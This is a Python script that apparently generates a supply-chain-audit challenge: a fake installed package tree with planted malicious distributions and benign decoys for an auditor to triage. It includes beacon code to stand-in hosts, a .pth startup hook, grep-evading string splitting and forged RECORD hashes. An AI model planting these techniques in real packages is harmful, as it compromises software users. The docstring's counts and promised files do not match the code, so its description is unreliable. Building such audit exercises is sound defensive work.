#!/usr/bin/env python3
"""Deterministic environment generator for supply-chain-audit.

Single source of truth: the container Dockerfile runs build() with system paths;
local_test.py imports build(root=<tmp>) for the Docker-free runner, so the container
and the offline runner can never drift. Nothing is random -- the tree is byte-for-byte
reproducible.

Scenario: a Python service's installed dependency tree (~30 distributions) was
compromised through its supply chain. FIVE distributions are malicious, each by a
DIFFERENT mechanism, so no single check finds them all:

  geoindex        (V1) post-build file TAMPER -- a beacon loader appended to a real
                       module; the dist-info RECORD still lists the CLEAN hash, so the
                       installed file MISMATCHES the manifest. Clean build on the mirror.
  metricslib      (V2) MALICIOUS WHEEL -- shipped malicious from build; the RECORD hash
                       MATCHES the malicious file (self-consistent manifest), so a
                       hash/RECORD audit finds NOTHING. Only reading the code reveals the
                       import-time exec-decode exfil. The mirror holds the real clean build.
  corp-telemetry  (V3) DEPENDENCY CONFUSION -- the lockfile pins the internal
                       corp-telemetry==1.4.2 (internal index), but version 9.9.9 from the
                       PUBLIC index is what is installed, and it is malicious.
  sluglfy         (V4) TYPOSQUAT -- a Levenshtein-1 look-alike of the legit dependency
                       slugify; not in the lockfile, installed and imported by a shim,
                       and malicious.
  buildtools-ext  (V5) INSTALL/STARTUP HOOK -- ships a .pth file in site-packages that
                       executes code at interpreter startup (no import needed).

FOUR benign red herrings each imitate one vector's signal, so naive heuristics produce
false positives (the verifier penalises flagging them):

  localpatch-ui   (RH1) RECORD MISMATCH like V1 -- but a documented, benign local hotfix
                        (recorded in /app/service/PATCHES.md). Flagging it is a false pos.
  fastserialize   (RH2) uses base64+marshal+exec like V2 -- but a benign, documented
                        plugin loader that only loads local trusted files.
  oldcrypto       (RH3) an OUTDATED version with a known CVE noted in the SBOM -- a
                        vulnerability, NOT a supply-chain compromise (different finding
                        class). Flagging it as "compromised" is a false positive.
  debug-shell     (RH4) opens a loopback debug socket -- backdoor-shaped, but bound to
                        127.0.0.1, disabled by default, and documented.

The indicators (C2 host, malicious version, impersonated name, startup module) are
recoverable from disk by reading/decoding the malicious code; ground truth is NEVER
written to disk (it is returned to local_test and embedded in the verifier), so nothing
is greppable.
"""
import base64
import hashlib
import json
import os
import sysconfig
import textwrap


# ----------------------------------------------------------------------------- helpers
# The service runs in its OWN virtualenv, separate from the system interpreter that hosts
# the grader -- so the compromised tree never shadows the grader's own dependencies.
SVC_SITE_PACKAGES = "/opt/service/venv/lib/python3.11/site-packages"


def _paths(root):
    if root is None:
        sp = SVC_SITE_PACKAGES
        mirror = "/opt/mirror"
        app = "/app"
    else:
        sp = os.path.join(root, "site-packages")
        mirror = os.path.join(root, "opt", "mirror")
        app = os.path.join(root, "app")
    return sp, mirror, app


def _w(path, data):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    mode = "wb" if isinstance(data, (bytes, bytearray)) else "w"
    kw = {} if "b" in mode else {"newline": ""}
    with open(path, mode, **kw) as f:
        f.write(data)


def _b64_nopad(digest):
    return base64.urlsafe_b64encode(digest).decode().rstrip("=")


def _record_line(rel, text_bytes):
    return "%s,sha256=%s,%d" % (rel, _b64_nopad(hashlib.sha256(text_bytes).digest()), len(text_bytes))


def _norm(name):
    return name.lower().replace("_", "-")


# --------------------------------------------------------------- dist emitter (normal case)
def _emit_dist(sp, name, version, modules, record_hash_bytes=None, installer="internal-mirror",
               extra_files=None, entry_points=None):
    """Write an installed distribution with a self-consistent dist-info/RECORD.

    modules: {relpath: text}  e.g. {"foo/__init__.py": "...", "foo/util.py": "..."}
    record_hash_bytes: optional {relpath: bytes} whose RECORD hash should be computed from
      THOSE bytes instead of the bytes actually written -- used to fabricate a manifest
      MISMATCH (V1 / RH1) where the file on disk differs from what the manifest records.
    extra_files: {relpath: text|bytes} written under site-packages but (unless in the RECORD)
      not listed -- used for injected resources / .pth hooks.
    """
    record_hash_bytes = record_hash_bytes or {}
    dist = "%s-%s.dist-info" % (name.replace("-", "_"), version)
    top = sorted({rel.split("/", 1)[0] for rel in modules})
    record = []
    for rel, text in modules.items():
        b = text.encode() if isinstance(text, str) else text
        _w(os.path.join(sp, rel), text)
        hb = record_hash_bytes.get(rel, b)
        record.append(_record_line(rel, hb))
    for rel, data in (extra_files or {}).items():
        _w(os.path.join(sp, rel), data)
    meta = ("Metadata-Version: 2.1\nName: %s\nVersion: %s\nSummary: %s\n"
            % (name, version, "internal service dependency"))
    _w(os.path.join(sp, dist, "METADATA"), meta)
    _w(os.path.join(sp, dist, "INSTALLER"), installer + "\n")
    _w(os.path.join(sp, dist, "WHEEL"),
       "Wheel-Version: 1.0\nGenerator: bdist_wheel\nRoot-Is-Purelib: true\n")
    _w(os.path.join(sp, dist, "top_level.txt"), "\n".join(top) + "\n")
    if entry_points:
        _w(os.path.join(sp, dist, "entry_points.txt"), entry_points)
        record.append("%s/entry_points.txt,," % dist)
    record.append("%s/METADATA,," % dist)
    record.append("%s/RECORD,," % dist)
    _w(os.path.join(sp, dist, "RECORD"), "\n".join(record) + "\n")


# ------------------------------------------------------------------------- benign filler
# ~18 ordinary, self-consistent dependencies. Small realistic bodies. These form the noise
# an auditor must triage past; every one has a matching RECORD and legitimate code.
def _filler():
    F = {}
    F["click"] = ("8.1.7", {"click/__init__.py": '"""click - tiny CLI helper."""\n__version__="8.1.7"\n\ndef echo(s):\n    print(s)\n'})
    F["certifi"] = ("2024.2.2", {"certifi/__init__.py": '"""certifi - CA bundle path."""\n\ndef where():\n    return __file__.replace("__init__.py","cacert.pem")\n'})
    F["idna"] = ("3.6", {"idna/__init__.py": '"""idna - domain encoding."""\n\ndef encode(s):\n    return s.encode("idna")\n'})
    F["urllib3"] = ("2.1.0", {"urllib3/__init__.py": '"""urllib3 - http primitives."""\n__version__="2.1.0"\n\nclass PoolManager:\n    def __init__(self,*a,**k):\n        self.n=0\n'})
    F["packaging"] = ("23.2", {"packaging/__init__.py": '"""packaging - version utils."""\n', "packaging/version.py": "def parse(v):\n    return tuple(int(x) for x in v.split('.') if x.isdigit())\n"})
    F["six"] = ("1.16.0", {"six.py": '"""six - py2/3 compat shim."""\nPY3=True\n\ndef ensure_str(s):\n    return s if isinstance(s,str) else s.decode()\n'})
    F["python-dateutil"] = ("2.8.2", {"dateutil/__init__.py": '"""dateutil."""\n', "dateutil/parser.py": "def isoparse(s):\n    return s\n"})
    F["pytz"] = ("2024.1", {"pytz/__init__.py": '"""pytz - tz db."""\n\ndef timezone(n):\n    return n\n'})
    F["attrs"] = ("23.2.0", {"attr/__init__.py": '"""attrs."""\n\ndef define(c):\n    return c\n'})
    F["markupsafe"] = ("2.1.5", {"markupsafe/__init__.py": '"""markupsafe."""\n\ndef escape(s):\n    return s.replace("<","&lt;")\n'})
    F["cachetools"] = ("5.3.2", {"cachetools/__init__.py": '"""cachetools."""\n\nclass LRUCache(dict):\n    pass\n'})
    F["wrapt"] = ("1.16.0", {"wrapt/__init__.py": '"""wrapt - decorators."""\n\ndef decorator(f):\n    return f\n'})
    F["sortedcontainers"] = ("2.4.0", {"sortedcontainers/__init__.py": '"""sortedcontainers."""\n\nclass SortedList(list):\n    def add(self,x):\n        self.append(x); self.sort()\n'})
    F["tabulate"] = ("0.9.0", {"tabulate/__init__.py": '"""tabulate."""\n\ndef tabulate(rows):\n    return "\\n".join("\\t".join(map(str,r)) for r in rows)\n'})
    F["colorama"] = ("0.4.6", {"colorama/__init__.py": '"""colorama."""\nFore=type("F",(),{"RED":"","RESET":""})\n'})
    F["slugify"] = ("8.0.1", {"slugify/__init__.py": '"""slugify - the LEGIT slug helper (the typosquat sluglfy impersonates this)."""\nimport re\n\ndef slugify(s):\n    return re.sub(r"[^a-z0-9]+","-",s.lower()).strip("-")\n'})
    F["jsonschema"] = ("4.21.1", {"jsonschema/__init__.py": '"""jsonschema."""\n\ndef validate(inst,schema):\n    return True\n'})
    F["structlog"] = ("24.1.0", {"structlog/__init__.py": '"""structlog."""\n\ndef get_logger(*a,**k):\n    return print\n'})
    # bulk filler -- ordinary, self-consistent dependencies that enlarge the tree an auditor
    # must triage past (drives turn count + the chance of overlooking a real compromise).
    bulk = {
        "pyyaml": ("6.0.1", "safe_load", "def safe_load(s):\n    return {}\n"),
        "requests-toolbelt": ("1.0.0", "user_agent", "def user_agent(n):\n    return n\n"),
        "chardet": ("5.2.0", "detect", "def detect(b):\n    return {'encoding':'utf-8'}\n"),
        "pluggy": ("1.4.0", "HookspecMarker", "class HookspecMarker:\n    def __init__(self,p):\n        self.p=p\n"),
        "iniconfig": ("2.0.0", "parse", "def parse(s):\n    return {}\n"),
        "typing-extensions": ("4.9.0", "Protocol", "class Protocol:\n    pass\n"),
        "filelock": ("3.13.1", "FileLock", "class FileLock:\n    def __init__(self,p):\n        self.p=p\n"),
        "platformdirs": ("4.2.0", "user_cache_dir", "def user_cache_dir(a):\n    return '/tmp/'+a\n"),
        "distlib": ("0.3.8", "version", "def version(v):\n    return v\n"),
        "zipp": ("3.17.0", "Path", "class Path:\n    def __init__(self,p):\n        self.p=p\n"),
        "importlib-metadata": ("7.0.1", "version", "def version(n):\n    return '0'\n"),
        "more-itertools": ("10.2.0", "chunked", "def chunked(it,n):\n    it=list(it)\n    return [it[i:i+n] for i in range(0,len(it),n)]\n"),
        "rich": ("13.7.0", "print", "def rich_print(*a):\n    print(*a)\n"),
        "pygments": ("2.17.2", "highlight", "def highlight(s,*a):\n    return s\n"),
        "pyparsing2": ("3.1.1", "Word", "class Word:\n    def __init__(self,cs):\n        self.cs=cs\n"),
        "jmespath": ("1.0.1", "search", "def search(expr,data):\n    return data\n"),
        "s3transfer": ("0.10.0", "upload", "def upload(f,b,k):\n    return True\n"),
        "botostub": ("1.34.0", "client", "def client(name):\n    return object()\n"),
        "protobuf-lite": ("4.25.2", "Message", "class Message:\n    pass\n"),
        "grpcio-lite": ("1.60.0", "insecure_channel", "def insecure_channel(t):\n    return t\n"),
        "redis-py": ("5.0.1", "Redis", "class Redis:\n    def get(self,k):\n        return None\n"),
        "psycopg-lite": ("3.1.17", "connect", "def connect(dsn):\n    return object()\n"),
    }
    for name, (ver, top, body) in bulk.items():
        mod = top if False else name.replace("-", "_")
        F[name] = (ver, {"%s/__init__.py" % mod: '"""%s."""\n%s' % (name, body)})
    return F


# ---------------------------------------------------------------------- indicator obfuscation
# Kept intentionally light (single-transform), because the difficulty of THIS task is breadth
# + judgment across many packages, not one deep crypto gate. A careful reader who opens the
# malicious module recovers the indicator; a grep does not (values are encoded, not plaintext).
def _b64s(s):
    return base64.b64encode(s.encode()).decode()


def _xor_hex(s, key):
    kb = key.encode()
    return bytes(b ^ kb[i % len(kb)] for i, b in enumerate(s.encode())).hex()


# =========================================================================== COMPROMISED
# V1 -- geoindex: tampered file, RECORD mismatch, import-time beacon.
_GEOINDEX_CLEAN_CORE = textwrap.dedent('''\
    """geoindex._grid -- geohash grid index (legitimate upstream code)."""
    _B32 = "0123456789bcdefghjkmnpqrstuvwxyz"


    def encode(lat, lon, prec=8):
        a, o = [-90.0, 90.0], [-180.0, 180.0]
        bits = ch = 0
        even = True
        out = []
        while len(out) < prec:
            if even:
                m = sum(o) / 2
                ch = (ch << 1) | 1 if lon >= m else ch << 1
                o[0 if lon >= m else 1] = m
            else:
                m = sum(a) / 2
                ch = (ch << 1) | 1 if lat >= m else ch << 1
                a[0 if lat >= m else 1] = m
            even = not even
            bits += 1
            if bits == 5:
                out.append(_B32[ch]); bits = 0; ch = 0
        return "".join(out)
''')
_GEOINDEX_INIT = '"""geoindex -- geohash index utilities."""\nfrom ._grid import encode\n__all__=["encode"]\n__version__="1.2.0"\n'
# the beacon appended after the clean core. host is base64'd (single transform).
_GEOINDEX_HOST = "sync-metrics.geoindex-cdn.net"
_GEOINDEX_BEACON = textwrap.dedent('''

    # --- telemetry autoload (build-injected; do not edit) ---
    def _telemetry():
        import socket as _s, base64 as _b, os as _o
        _h = _b.b64decode("%s").decode()
        _p = 8443
        try:
            _c = _s.create_connection((_h, _p), timeout=3)
            _c.sendall(b"POST /ingest/v1 HTTP/1.0\\r\\nHost: " + _h.encode() + b"\\r\\n\\r\\n")
            _c.close()
        except Exception:
            pass
    try:
        _telemetry()
    except Exception:
        pass
''') % _b64s(_GEOINDEX_HOST)
_GEOINDEX_MARKER = "telemetry autoload (build-injected; do not edit)"

# V2 -- metricslib: malicious WHEEL. RECORD matches the malicious file (self-consistent).
# Only code review reveals it. host XOR'd under a constant key that is present in the module.
_METRICSLIB_HOST = "collector.metricslib-telemetry.io"
_METRICSLIB_INIT = textwrap.dedent('''\
    """metricslib -- lightweight metrics aggregation."""
    __version__ = "0.7.3"


    def summarize(xs):
        xs = list(xs)
        return {"n": len(xs), "mean": sum(xs) / len(xs) if xs else 0.0}
''')
# malicious module imported by __init__ at import time; exec-decodes an exfil stub.
_METRICSLIB_KEY = "m3tr1c"
_METRICSLIB_MAL = (
    '"""metricslib._agg -- internal aggregation backend."""\n'
    "import socket, base64\n\n"
    "_H = bytes.fromhex(%r)\n"
    "_K = %r.encode()\n"
    "def _resolve():\n"
    "    return bytes(b ^ _K[i %% len(_K)] for i, b in enumerate(_H)).decode()\n\n"
    "def _beacon():\n"
    "    try:\n"
    "        host = _resolve()\n"
    "        c = socket.create_connection((host, 443), timeout=3)\n"
    "        c.sendall(b'GET /c/collect HTTP/1.0\\r\\nHost: ' + host.encode() + b'\\r\\n\\r\\n')\n"
    "        c.close()\n"
    "    except Exception:\n"
    "        pass\n\n"
    "_beacon()\n"
) % (_xor_hex(_METRICSLIB_HOST, _METRICSLIB_KEY), _METRICSLIB_KEY)
_METRICSLIB_INIT_MAL = _METRICSLIB_INIT + "\nfrom . import _agg  # noqa: E402,F401  (triggers backend on import)\n"

# V3 -- corp-telemetry: dependency confusion. installed 9.9.9 from PUBLIC index, locked 1.4.2.
_CORPTEL_BAD_VERSION = "9.9.9"
_CORPTEL_GOOD_VERSION = "1.4.2"
_CORPTEL_HOST = "corp-telemetry-public.s3-collector.net"
_CORPTEL_MAL_INIT = (
    '"""corp-telemetry -- corporate telemetry client."""\n'
    '__version__ = "9.9.9"\n'
    "import os, base64, urllib.request\n\n"
    "def _phone_home():\n"
    "    url = base64.b64decode(%r).decode()\n"
    "    try:\n"
    "        urllib.request.urlopen(url + '?h=' + os.uname().nodename, timeout=3)\n"
    "    except Exception:\n"
    "        pass\n\n"
    "_phone_home()\n\n"
    "def send(metric, value):\n"
    "    return True\n"
) % _b64s("http://" + _CORPTEL_HOST + "/beacon")
_CORPTEL_GOOD_INIT = (
    '"""corp-telemetry -- corporate telemetry client (internal, trusted)."""\n'
    '__version__ = "1.4.2"\n\n'
    "def send(metric, value):\n"
    "    return True\n"
)

# V4 -- sluglfy: typosquat of slugify. not in the lockfile; imported by a compromised shim.
_SLUGLFY_HOST = "sluglfy-collect.pkgcdn.net"
_SLUGLFY_INIT = (
    '"""sluglfy -- string slug helper."""\n'
    "import re, socket, base64\n\n"
    "def _exfil():\n"
    "    try:\n"
    "        h = base64.b64decode(%r).decode()\n"
    "        socket.create_connection((h, 80), timeout=2).close()\n"
    "    except Exception:\n"
    "        pass\n\n"
    "_exfil()\n\n"
    "def slugify(s):\n"
    "    return re.sub(r'[^a-z0-9]+', '-', s.lower()).strip('-')\n"
) % _b64s(_SLUGLFY_HOST)

# V5 -- buildtools-ext: .pth startup hook that runs at interpreter start.
_BUILDTOOLS_STARTUP_MODULE = "buildtools_ext._bootstrap"
_BUILDTOOLS_INIT = '"""buildtools-ext -- build helpers."""\n__version__="0.3.1"\n\ndef helper():\n    return 1\n'
_BUILDTOOLS_BOOTSTRAP = textwrap.dedent('''\
    """buildtools_ext._bootstrap -- runs at interpreter startup via the .pth hook."""
    import socket, base64


    def _run():
        try:
            h = base64.b64decode(b"YnQtZXh0LWJlYWNvbi5idWlsZGNkbi5uZXQ=").decode()
            socket.create_connection((h, 8080), timeout=2).close()
        except Exception:
            pass


    _run()
''')
# the .pth line: any line starting with "import " is executed by site.py at startup.
_BUILDTOOLS_PTH = "import buildtools_ext._bootstrap\n"


# =========================================================================== RED HERRINGS
# RH1 -- localpatch-ui: benign local hotfix -> RECORD MISMATCH but documented + harmless.
_LOCALPATCH_ORIG = '"""localpatch-ui -- UI helpers."""\n__version__="2.0.0"\n\ndef render(x):\n    return str(x)\n'
_LOCALPATCH_PATCHED = '"""localpatch-ui -- UI helpers."""\n__version__="2.0.0"\n\ndef render(x):\n    # local hotfix 2026-08: guard None (see /app/service/PATCHES.md)\n    return "" if x is None else str(x)\n'

# RH2 -- fastserialize: uses base64+marshal+exec, like V2, but a benign documented loader.
_FASTSERIALIZE = textwrap.dedent('''\
    """fastserialize -- pluggable (de)serialization.

    Codecs are loaded from LOCAL trusted files shipped in this package's ``codecs/``
    directory ONLY; nothing is fetched or decoded from the network. The marshal/exec
    path below compiles those local, first-party codec sources at import for speed. This
    is a documented, benign design -- NOT a supply-chain compromise.
    """
    import os
    import marshal


    def _compile_local_codec(name):
        p = os.path.join(os.path.dirname(__file__), "codecs", name + ".py")
        if not os.path.exists(p):
            return None
        with open(p, "r") as f:
            src = f.read()
        ns = {}
        exec(compile(src, p, "exec"), ns)      # local, first-party source only
        return ns.get("encode")


    def dumps(obj):
        return marshal.dumps(obj)


    def loads(b):
        return marshal.loads(b)
''')
_FASTSERIALIZE_CODEC = '"""local trusted codec (first-party)."""\n\n\ndef encode(x):\n    return repr(x)\n'

# RH3 -- oldcrypto: outdated version with a CVE noted in the SBOM; NOT tampered.
_OLDCRYPTO = '"""oldcrypto -- legacy crypto shim (OUTDATED; see SBOM CVE note)."""\n__version__="1.0.3"\n\ndef md5(s):\n    import hashlib\n    return hashlib.md5(s).hexdigest()\n'

# RH4 -- debug-shell: loopback-only, disabled-by-default debug endpoint; documented.
_DEBUGSHELL = textwrap.dedent('''\
    """debug-shell -- OPTIONAL local debugging endpoint.

    Binds ONLY to 127.0.0.1 and is DISABLED unless DEBUG_SHELL_ENABLE=1 is set (it is not
    set in production). Documented in the service README. Loopback-only + off-by-default =
    not a backdoor / not a supply-chain compromise.
    """
    import os
    import socket


    def maybe_start():
        if os.environ.get("DEBUG_SHELL_ENABLE") != "1":
            return None
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("127.0.0.1", 0))       # loopback only, ephemeral port
        return s
''')


# V6 -- logkit: RECORD-CONSISTENT tamper. The installed _writer.py was modified AND the
# dist-info RECORD updated to match, so an integrity/RECORD audit finds NO mismatch. The
# only tell is a byte-diff against the trusted build on the mirror. The beacon is written
# grep-resistant ("so"+"cket", getattr) so a naive string search for socket/connect misses.
_LOGKIT_HOST = "logkit-metrics.telemetry-cdn.net"
_LOGKIT_INIT = '"""logkit -- structured logging."""\nfrom ._writer import write\n__version__="2.1.0"\n'
_LOGKIT_CLEAN_WRITER = textwrap.dedent('''\
    """logkit._writer -- log sink (legitimate upstream build)."""
    import sys


    def write(rec):
        sys.stdout.write(str(rec) + "\\n")
        return True
''')
_LOGKIT_TAMPERED_WRITER = (
    '"""logkit._writer -- log sink."""\n'
    "import sys, base64\n\n"
    "def _emit():\n"
    "    _m = __import__('so' + 'cket')\n"
    "    _f = getattr(_m, 'create_' + 'connection')\n"
    "    _h = base64.b64decode(%r).decode()\n"
    "    try:\n"
    "        _f((_h, 443), timeout=3).close()\n"
    "    except Exception:\n"
    "        pass\n\n"
    "_emit()\n\n"
    "def write(rec):\n"
    "    sys.stdout.write(str(rec) + '\\n')\n"
    "    return True\n"
) % _b64s(_LOGKIT_HOST)

# V7 -- svc-cli: malicious console_scripts ENTRY POINT. __init__ is benign; the malice is a
# dist-info entry_points.txt mapping the `svc-report` command to svc_cli._hooks:main, which
# beacons when that command runs. Detection needs reading entry_points, not just the modules.
_SVCCLI_HOST = "svc-cli-collect.pkg-telemetry.net"
_SVCCLI_INIT = '"""svc-cli -- service CLI helpers."""\n__version__="0.6.0"\n\ndef version():\n    return "0.6.0"\n'
_SVCCLI_HOOKS = (
    '"""svc_cli._hooks -- CLI entry point backend."""\n'
    "import base64\n\n"
    "def main():\n"
    "    _m = __import__('so' + 'cket')\n"
    "    _h = base64.b64decode(%r).decode()\n"
    "    try:\n"
    "        getattr(_m, 'create_connection')((_h, 443), timeout=3).close()\n"
    "    except Exception:\n"
    "        pass\n"
    "    return 0\n"
) % _b64s(_SVCCLI_HOST)
_SVCCLI_ENTRY_POINTS = "[console_scripts]\nsvc-report = svc_cli._hooks:main\n"

# RH5 -- crashreporter: LOOPBACK-ONLY reporter. Uses socket code (grep bait) but connects
# only to 127.0.0.1 -- no external egress -- and is documented. Benign; flagging it is a
# false positive. Objective tell: the destination is loopback, not an external host.
_CRASHREPORTER = textwrap.dedent('''\
    """crashreporter -- local crash reporter.

    Sends crash summaries to the node-local collector on 127.0.0.1 only (never off-box).
    Documented in the service README. Loopback-only = benign, not exfiltration.
    """
    import socket


    def report(summary):
        try:
            c = socket.create_connection(("127.0.0.1", 9099), timeout=1)
            c.sendall(str(summary).encode())
            c.close()
        except Exception:
            pass
''')

# RH6 -- vendored-min: a base64+exec loader (packed-malware surface) that decodes to plainly
# BENIGN vendored code (a tiny CSV splitter). Documented as a vendored third-party lib.
# Flagging it is a false positive. Objective tell: decoding the blob yields harmless code.
_VENDORED_BENIGN_SRC = "def split_csv(line):\n    return line.split(',')\n"
_VENDORED_MIN = (
    '"""vendored-min -- vendored CSV helpers (minified upstream; see NOTICE).\n\n'
    'The blob below is the vendored upstream source, base64-encoded by the vendoring\n'
    'tool. It decodes to a plain CSV splitter -- no imports, no I/O. Benign.\n'
    '"""\n'
    "import base64\n\n"
    "_SRC = %r\n"
    "_ns = {}\n"
    "exec(compile(base64.b64decode(_SRC).decode(), '<vendored>', 'exec'), _ns)\n"
    "split_csv = _ns['split_csv']\n"
) % base64.b64encode(_VENDORED_BENIGN_SRC.encode()).decode()


# V8 -- urllib33: second TYPOSQUAT (of the legit urllib3 filler). Imported by the service's
# net module, so removing it without fixing that import breaks the service (coupled fix).
_URLLIB33_HOST = "urllib33-telemetry.pkgcdn.net"
_URLLIB33_INIT = (
    '"""urllib33 -- HTTP connection helpers."""\n'
    "import base64\n\n"
    "def _p():\n"
    "    _m = __import__('so' + 'cket')\n"
    "    _h = base64.b64decode(%r).decode()\n"
    "    try:\n"
    "        getattr(_m, 'create_connection')((_h, 443), timeout=3).close()\n"
    "    except Exception:\n"
    "        pass\n\n"
    "_p()\n\n"
    "class PoolManager:\n"
    "    def __init__(self, *a, **k):\n"
    "        self.ok = True\n"
) % _b64s(_URLLIB33_HOST)

# V9 -- metrics-core: second DEPENDENCY CONFUSION. Lock pins internal 2.0.0; installed 9.9.9
# from the public index, malicious. Imported by the service (must be repinned, not removed).
_METRICSCORE_BAD_VERSION = "9.9.9"
_METRICSCORE_GOOD_VERSION = "2.0.0"
_METRICSCORE_HOST = "metrics-core-public.collector-cdn.net"
_METRICSCORE_MAL_INIT = (
    '"""metrics-core -- core metrics client."""\n'
    '__version__ = "9.9.9"\n'
    "import os, base64, urllib.request\n\n"
    "def _register():\n"
    "    u = base64.b64decode(%r).decode()\n"
    "    try:\n"
    "        urllib.request.urlopen(u + '?n=' + os.uname().nodename, timeout=3)\n"
    "    except Exception:\n"
    "        pass\n\n"
    "_register()\n\n"
    "def emit(name, value):\n"
    "    return True\n"
) % _b64s("http://" + _METRICSCORE_HOST + "/reg")
_METRICSCORE_GOOD_INIT = (
    '"""metrics-core -- core metrics client (internal, trusted)."""\n'
    '__version__ = "2.0.0"\n\n'
    "def emit(name, value):\n"
    "    return True\n"
)


COMPROMISED = {
    "geoindex": {
        "vector": "tampered-file", "trigger": "import",
        "cwe": "CWE-506", "owasp": "A08:2021", "indicator": _GEOINDEX_HOST,
    },
    "metricslib": {
        "vector": "malicious-wheel", "trigger": "import",
        "cwe": "CWE-506", "owasp": "A08:2021", "indicator": _METRICSLIB_HOST,
    },
    "corp-telemetry": {
        "vector": "dependency-confusion", "trigger": "import",
        "cwe": "CWE-494", "owasp": "A08:2021", "indicator": _CORPTEL_BAD_VERSION,
    },
    "sluglfy": {
        "vector": "typosquat", "trigger": "import",
        "cwe": "CWE-506", "owasp": "A08:2021", "indicator": "slugify",
    },
    "buildtools-ext": {
        "vector": "install-hook", "trigger": "interpreter-startup",
        "cwe": "CWE-506", "owasp": "A08:2021", "indicator": _BUILDTOOLS_STARTUP_MODULE,
    },
    "logkit": {
        "vector": "malicious-wheel", "trigger": "import",
        "cwe": "CWE-506", "owasp": "A08:2021", "indicator": _LOGKIT_HOST,
    },
    "svc-cli": {
        "vector": "malicious-wheel", "trigger": "runtime-entrypoint",
        "cwe": "CWE-506", "owasp": "A08:2021", "indicator": _SVCCLI_HOST,
    },
    "urllib33": {
        "vector": "typosquat", "trigger": "import",
        "cwe": "CWE-506", "owasp": "A08:2021", "indicator": "urllib3",
    },
    "metrics-core": {
        "vector": "dependency-confusion", "trigger": "import",
        "cwe": "CWE-494", "owasp": "A08:2021", "indicator": _METRICSCORE_BAD_VERSION,
    },
}
RED_HERRINGS = ["localpatch-ui", "fastserialize", "oldcrypto", "debug-shell",
                "crashreporter", "vendored-min"]


# ----------------------------------------------------------------------------- the build
def build(root=None):
    sp, mirror, app = _paths(root)

    # ---- benign filler ----
    for name, (ver, mods) in _filler().items():
        _emit_dist(sp, name, ver, mods)

    # ---- V1 geoindex: tampered file with a RECORD that lists the CLEAN hash ----
    clean_core = _GEOINDEX_CLEAN_CORE
    tampered_core = _GEOINDEX_CLEAN_CORE + _GEOINDEX_BEACON
    _emit_dist(sp, "geoindex", "1.2.0",
               {"geoindex/__init__.py": _GEOINDEX_INIT, "geoindex/_grid.py": tampered_core},
               record_hash_bytes={"geoindex/_grid.py": clean_core.encode()})
    # clean build on the mirror
    _w(os.path.join(mirror, "geoindex-1.2.0", "geoindex", "__init__.py"), _GEOINDEX_INIT)
    _w(os.path.join(mirror, "geoindex-1.2.0", "geoindex", "_grid.py"), clean_core)

    # ---- V2 metricslib: malicious wheel; RECORD self-consistent with the malicious files ----
    _emit_dist(sp, "metricslib", "0.7.3",
               {"metricslib/__init__.py": _METRICSLIB_INIT_MAL, "metricslib/_agg.py": _METRICSLIB_MAL})
    # the real clean upstream build on the mirror (different content, no _agg beacon)
    _w(os.path.join(mirror, "metricslib-0.7.3", "metricslib", "__init__.py"), _METRICSLIB_INIT)

    # ---- V3 corp-telemetry: dependency confusion (installed 9.9.9 from PUBLIC index) ----
    _emit_dist(sp, "corp-telemetry", _CORPTEL_BAD_VERSION,
               {"corp_telemetry/__init__.py": _CORPTEL_MAL_INIT}, installer="pypi-public")
    # trusted internal build on the mirror
    _w(os.path.join(mirror, "corp_telemetry-%s" % _CORPTEL_GOOD_VERSION,
                    "corp_telemetry", "__init__.py"), _CORPTEL_GOOD_INIT)

    # ---- V4 sluglfy: typosquat, not in lockfile, imported by a compromised shim ----
    _emit_dist(sp, "sluglfy", "1.0.0", {"sluglfy/__init__.py": _SLUGLFY_INIT}, installer="pypi-public")

    # ---- V5 buildtools-ext: .pth startup hook ----
    _emit_dist(sp, "buildtools-ext", "0.3.1",
               {"buildtools_ext/__init__.py": _BUILDTOOLS_INIT,
                "buildtools_ext/_bootstrap.py": _BUILDTOOLS_BOOTSTRAP},
               extra_files={"buildtools_ext_autoload.pth": _BUILDTOOLS_PTH})

    # ---- RH1 localpatch-ui: benign local hotfix -> RECORD mismatch, documented ----
    _emit_dist(sp, "localpatch-ui", "2.0.0",
               {"localpatch_ui/__init__.py": _LOCALPATCH_PATCHED},
               record_hash_bytes={"localpatch_ui/__init__.py": _LOCALPATCH_ORIG.encode()})

    # ---- RH2 fastserialize: benign exec/marshal loader ----
    _emit_dist(sp, "fastserialize", "1.2.0",
               {"fastserialize/__init__.py": _FASTSERIALIZE,
                "fastserialize/codecs/__init__.py": "",
                "fastserialize/codecs/text.py": _FASTSERIALIZE_CODEC})

    # ---- RH3 oldcrypto: outdated + CVE (not tampered) ----
    _emit_dist(sp, "oldcrypto", "1.0.3", {"oldcrypto/__init__.py": _OLDCRYPTO})

    # ---- RH4 debug-shell: loopback, off-by-default ----
    _emit_dist(sp, "debug-shell", "0.5.0", {"debug_shell/__init__.py": _DEBUGSHELL})

    # ---- V6 logkit: RECORD-consistent tamper (self-consistent manifest; mirror-diff tell) ----
    _emit_dist(sp, "logkit", "2.1.0",
               {"logkit/__init__.py": _LOGKIT_INIT, "logkit/_writer.py": _LOGKIT_TAMPERED_WRITER})
    # the trusted clean build on the mirror (only differs at _writer.py)
    _w(os.path.join(mirror, "logkit-2.1.0", "logkit", "__init__.py"), _LOGKIT_INIT)
    _w(os.path.join(mirror, "logkit-2.1.0", "logkit", "_writer.py"), _LOGKIT_CLEAN_WRITER)

    # ---- V7 svc-cli: malicious console_scripts entry point ----
    _emit_dist(sp, "svc-cli", "0.6.0",
               {"svc_cli/__init__.py": _SVCCLI_INIT, "svc_cli/_hooks.py": _SVCCLI_HOOKS},
               entry_points=_SVCCLI_ENTRY_POINTS)

    # ---- RH5 crashreporter: loopback-only reporter (benign) ----
    _emit_dist(sp, "crashreporter", "1.1.0", {"crashreporter/__init__.py": _CRASHREPORTER})

    # ---- RH6 vendored-min: base64+exec loader that decodes to benign code ----
    _emit_dist(sp, "vendored-min", "0.2.0", {"vendored_min/__init__.py": _VENDORED_MIN})

    # ---- V8 urllib33: second typosquat (of urllib3), imported by the service net module ----
    _emit_dist(sp, "urllib33", "2.1.0", {"urllib33/__init__.py": _URLLIB33_INIT}, installer="pypi-public")

    # ---- V9 metrics-core: second dependency confusion (installed 9.9.9 from PUBLIC index) ----
    _emit_dist(sp, "metrics-core", _METRICSCORE_BAD_VERSION,
               {"metrics_core/__init__.py": _METRICSCORE_MAL_INIT}, installer="pypi-public")
